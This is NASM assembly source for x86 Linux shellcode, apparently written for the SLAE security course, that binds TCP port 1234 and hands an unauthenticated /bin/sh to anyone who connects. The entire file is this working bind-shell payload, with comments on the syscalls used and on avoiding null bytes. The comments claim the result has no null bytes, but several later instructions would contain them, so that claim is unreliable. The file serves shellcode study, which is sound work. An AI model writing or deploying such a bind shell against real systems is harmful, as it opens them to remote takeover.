; SLAE-X 
; thanks to writesup from previou students
; syscalls doc is here: /usr/include/i386-linux-gnu/asm/unistd_32.h
; originality : not much in this assignment, NASM function allowing to specify port in human readable format, my own assembly to avoid null bytes 
; requirement : no null byte only , verify with objdump -d simplebindshell -M intel | grep 00


; this function allows to specify port in human readable format 
%define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
%define _port 1234
PORT equ htons(_port) 
; this function is NOT injected in assembly by compiler, it is computed at build time 

global _start 


_start: 
	; syscall "socket", with fd argument provided, 0x1 in ebx 
	; arguments are PF_INET = AF_INET (2), SOCK_STREAM (1), IPPROTO_IP(0) in reverse order  
	mov    bl,0x1
	; the two next operands simply replace "push 0x0" which contains a null byte 
	xor eax,eax
	push eax 
	; 
	push   0x1
	push   0x2
	; here we create a structure by sending a pointer to esp (where we pushed arguments), the struct lives on the stack   
	mov    ecx,esp
	; syscall "socket" is number 112, 0x66 in hex 
	mov    ax,0x66
	int    0x80
	; saving file descriptor received into edi, i tried to use the .bss section at first but it did not work on shellcode injection (it skips the part where the elf init the .bss?) 
	mov    edi,eax

	; syscall "socket", with bind argument provided, 0x2 in ebx  
	mov    ebx,0x2
	push   0x0
	push word  PORT 
	push word  0x2
	mov    ecx,esp
	push   0x10
	push   ecx
	push   edi
	mov    ecx,esp
	mov    eax,0x66
	int    0x80

	; syscall "socket", with argument listen 
	push   0x0
	push   edi
	mov    ecx,esp
	mov    eax,0x66
	mov    ebx,0x4
	int    0x80

	; syscall "socket", with argument accept 
	mov    eax,0x66
	mov    ebx,0x5
	push   0x0
	push   0x0
	push   edi
	mov    ecx,esp
	int    0x80

	; duplicating fd from socket to stdin stdout stderr of the process 
	mov    ebx,eax
	mov    ecx,0x2
	loop: 
	; syscall dup2 
	mov    eax,0x3f
	int    0x80
	dec    ecx
	jns    loop 

	; syscall "execve" with arguments /bin/sh null terminated and a null string for envp argument  
	mov    eax,0xb
	push   0x0
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx,esp
	push   0x0
	mov    edx,esp
	push   ebx
	mov    ecx,esp
	int    0x80

	; exit cleanly 
	mov    eax,0x1
	mov    ebx,0x0
	int    0x80
